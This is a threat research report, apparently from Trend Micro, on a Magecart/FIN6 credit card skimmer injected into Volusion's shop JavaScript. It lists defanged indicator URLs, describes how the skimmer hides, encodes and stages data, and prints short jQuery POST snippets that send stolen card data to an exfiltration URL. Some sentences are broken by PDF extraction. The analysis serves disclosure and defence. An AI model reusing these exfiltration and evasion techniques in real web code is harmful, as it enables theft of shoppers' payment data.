Our data shows that the attack started on September 7, 2019. All of the\nimpacted online shops are hosted on the cloud platform of the e-commerce service provider “Volusion,” one\nof the [top e-commerce platforms in the market. This is actually the third time we have identified a card](https://www.ecommerceceo.com/ecommerce-platforms/)\nskimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already\n\n\nGo to…\n\n\n-----\n\nthousands of online shops.\n\nWe found malicious code injected into a JavaScript library provided by Volusion to their client shops. The\ninjected code loaded another JavaScript stored on a [Google Storage service. The loaded script is almost a](https://cloud.google.com/storage/)\ndirect copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers\nsubmit their payment information, the skimmer will copy and send the personal information and credit card\ndetails to an exfiltration server belonging to the attackers.\n\nOur team contacted Google and they have removed the file. The attack is currently offline. As of publication,\nVolusion has [acknowledged and](https://twitter.com/Volusion/status/1181652914340798467) [fixed the issue.](https://twitter.com/Volusion/status/1181661671674335232?s=20)\n\nFigure 1. Online credit card skimming attack chain\n\n\n-----\n\nFigure 2. Country distribution of online shop users who accessed the card skimmer (based on data from the\n\nTrend Micro™ Smart Protection Network™ infrastructure)\n\nDuring our investigation, we found that the attackers seemed more experienced and thoughtful than many\nother skimmer groups. They did not simply add their malicious code at the top or end of a script; instead, they\ncarefully integrated the code into the original script to be part of the execution flow of the program. The code\nwas also written as simply as possible, making it difficult to be identified in a big library. Furthermore, they\nregistered the domain of their exfiltration server in a similar style to a legitimate Volusion domain.\n\nConsidering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been\n[identified as the notorious threat actor](https://twitter.com/ydklijnsma/status/1167837317232377856) [FIN6. We found similarities in the code used in this attack and the code](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)\nused in FIN6’s previous attacks on [British Airways and](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/) [Newegg.](https://www.riskiq.com/blog/labs/magecart-newegg/)\n\n**_Analysis of the code injection_**\n\nThe attackers injected their code into a library provided on Volusion’s e-commerce platform for their client\nshops. The script, described by the comments on the library, includes the necessary code for the pop-out\nfeature of the shop’s navigation menu. It was also used on the shop checkout page. The script is located at:\n\n- hxxps://[online shop domain]/a/j/vnav.js\n\nThe attackers didn’t just inject their code inside the library. They also integrated their code into the original\nfunction of [jQueryUI code to be executed with the original execution flow. They created a new object](https://jqueryui.com/)\n“e.widget.unbridge” right before the original object “e.widget.bridge” and the malicious code is inside the\nnew object. It’s worth noting that the attackers even wrote their malicious code in a similar coding style to\nmake it look more like a part of the original source code.\n\nThe injected object will create a new script element to load another remote script stored on Google Storage.\n\n\n-----\n\nFigure 3. Malicious script injected into Volusion’s JavaScript library\n\nFigure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injected\n\nmalicious code is highlighted\n\n**Analysis of the credit card skimmer**\n\nThe loaded remote script is on Google Storage:\n\n- hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js\n\n[Much of the code inside the script is from the library “js-cookie” version 2.2.1. However, the attackers](https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.js)\nmodified it and integrated a credit card skimmer into the original script. The skimmer binds at the events\n[“mousedown” and](https://api.jquery.com/mousedown/) [“touchstart” of the payment submit button.](https://www.w3schools.com/jsref/event_touchstart.asp)\n\nThis means that when victims click (from desktop) or touch (from mobile devices) the submit button, the\nevents will be triggered and the skimmer will be executed.\n\n\n-----\n\nFigure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js-cookie”\n\nlibrary (right)\n\nThe skimmer copies the information on the entire payment form: the victim’s name, address, phone number,\nemail address, and credit card details (the number, cardholder name, expiration month, expiration year, and\nCVV number).\n\nOnce the skimmer has the credit card details, it serializes the copied data into a string and encodes it with\nBase64. Then, it performs a character permutation on the encoded string to make sure it can’t be directly\ndecoded with Base64 decoding.\n\nThe data will then be stored in [sessionStorage with the key “__utmz_opt_in_out”. The next time the skimmer](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)\nis loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it\nwill use HTTP POST to send the stolen payment information to a remote server at “hxxps[:]//volusioncdn[.]com/analytics/beacon” for exfiltration.\n\n\n-----\n\nNote that the attackers used the domain “volusion-cdn[.]com” for their exfiltration server, a similar name to\nVolusion’s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is\nbecause Volusion is also running its [service on the Google Cloud Platform.](https://cloud.google.com/customers/volusion/)\n\n**_Evidence of Magecart or FIN6_**\n\nAs previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6,\nalso known as the threat actor FIN6. Here are the connections we considered:\n\nGroup 6 is known to only target top-tier victims, investing in scams where they can receive a big\npayoff from one attack. This single hack of Volusion allows them to receive credit card data from 3,126\nonline shops.\nFrom the previous skimming attack on the British Airways and Newegg websites, we know that Group\n6 tried to register the domains of the exfiltration server to be similar to the victims’ domains. In this\ncase, the domain of the exfiltration server is “volusion-cdn[.]com” — very similar to the valid domain\n“cdn3[.]volusion[.]com” from Volusion. In addition, the exfiltration domains used during the British\nAirways, Newegg, and Volusion attacks are all registered through [Namecheap.](https://www.namecheap.com/)\nWe found that the skimmer is an improved version of the previous skimmer used in the attacks on\nBritish Airways and Newegg. Both old and current skimmers are written with jQuery, serialize the\nstolen data, and use the jQuery.ajax function to POST data to a remote server. Although the older\nskimmer is much simpler compared to the current one, it didn’t encode the stolen data or store the data\nin sessionStorage before the exfiltration.\n\n**Target** **Script of data exfiltration request**\n\njQuery.ajax({type:”POST”,async:0,url:”[exfiltration\nBritish Airways\nurl]”,data:t,dataType:”application/json})\n\njQuery.ajax({type:”POST”,async:true,url:”[exfiltration\nNewegg\nurl]”,data:pdati,dataType:”application/json})\n\n\nVolusion\n\n\n$.ajax({type: ‘POST’,url: ‘[exfiltration url]’,dataType:\n‘application/x-www-form-urlencoded’,data: d,complete: function()\n{ window.sessionStorage.removeItem(‘__utmz_opt_in_out’); }})\n\n\nIt’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart”\nof the payment submit button. The previous Group 6 skimmer binds to event “mouseup” and event\n“touchend”.\n\nThese events are different, but they are the pairs of each other that trigger the skimmer at almost the same\ntime. It seems that they want to trigger the skimmer at the same moment, but the current version binds on two\nopposite events of the pairs to avoid detection from heuristic rules.\n\n**Target** **Script of event binding**\nBritish Airways .bind(“mouseup touchend”, function(a) {…})\nNewegg .bind(“mouseup touchend”, function(e) {…})\nVolusion .bind(‘mousedown touchstart’, z)\n\nIt seems that Magecart is continuing to change and experiment with new attack methods, refining its skimmer\nto evade detection. Sophisticated groups such as these will always try to find new ways to stay undetected in\ntheir victims’ systems.\n\nTo defend against this type of threat, website owners should regularly check and [strengthen their security](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patching-problems-and-how-to-solve-them)\nwith patches and server segregation.
